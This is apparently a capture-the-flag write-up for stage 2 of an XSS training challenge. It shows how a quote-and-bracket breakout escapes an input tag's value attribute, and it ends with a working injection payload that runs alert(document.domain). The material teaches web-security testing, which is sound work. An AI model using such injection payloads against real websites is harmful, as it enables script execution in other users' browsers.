# **XSS Challenges Stage 2**

Like chanllenges Stage 1.
Let insert something to get the feedback look like.

![](https://i.imgur.com/UAGWUg0.png)

```
<input type="text" name="p1" size="50" value="aaa">   <input type="submit" value="Search">
```

Here we got that we should end the tag before creating new one.

Let's try ```"><a style="``` to see the feedback.

![](https://i.imgur.com/pqgrVnc.png)

Great, nothing back. It seems all offset we inserted just become part of code.

Let's see the source code of feedback.

```
<input type="text" name="p1" size="50" value=""> <a style="">   <input type="submit" value="Search">
```

Then the last step just to modify it to match the question's requirement.

```
"><script>alert(document.domain);</script><a style="
```